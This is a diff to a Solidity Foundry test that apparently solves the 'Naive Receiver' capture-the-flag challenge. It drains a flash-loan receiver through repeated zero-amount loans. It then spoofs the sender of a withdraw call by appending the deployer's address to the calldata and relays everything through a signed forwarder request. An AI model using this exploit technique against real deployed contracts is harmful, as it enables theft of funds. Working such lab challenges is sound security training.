@@ -78,25 +78,55 @@ contract NaiveReceiverChallenge is Test {
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
 
-        uint8 numberOfLoans = 10;
+        uint8 numberOfCalls = 11;
 
         // Create array of encoded flashLoan calls
-        bytes[] memory encodedCalls = new bytes[](numberOfLoans);
+        bytes[] memory encodedCalls = new bytes[](numberOfCalls);
 
-        for(uint8 i = 0;  <= numberOfLoans; i++) {
+        for(uint8 i = 0; i < 10; i++) {
             // Encode the call to flashLoan
             encodedCalls[i] = abi.encodeWithSignature(
-                "flashLoan(address,uint256,bytes)",
+                "flashLoan(address,address,uint256,bytes)",
                 address(receiver),
+                address(weth),
                 0,
                 ""
             );
         }
 
-        // Execute the multicall transaction
-        pool.multicall(encodedCalls);
+        // Encode the call to withdraw
+        encodedCalls[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))), 
+            bytes32(uint256(uint160(deployer)))
+        );
 
-        
+        // Encode the multicall data
+        bytes memory multicallData = abi.encodeCall(pool.multicall, encodedCalls);
+
+        // Create the request
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: forwarder.nonces(player),
+            data: multicallData,
+            deadline: 1 days
+        });
+
+        // Hash the request
+        bytes32 requestHash = keccak256(abi.encodePacked(
+            "\x19\x01",
+            forwarder.domainSeparator(),
+            forwarder.getDataHash(request)
+            )
+        );
+
+        // Sign the request
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Execute the tansaction
+        forwarder.execute(request, signature);
     }
 
     /**
